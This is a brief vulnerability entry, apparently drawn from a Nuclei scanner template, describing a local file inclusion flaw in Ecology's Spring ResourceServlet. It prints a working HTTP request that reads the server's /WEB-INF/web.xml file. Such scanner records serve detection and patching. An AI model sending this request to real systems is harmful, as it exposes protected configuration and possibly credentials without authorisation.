# Vulnerability: Ecology Springframework - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`ecology-springframework-directory-traversal.yaml`)

## Description
Ecology Springframework is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
```

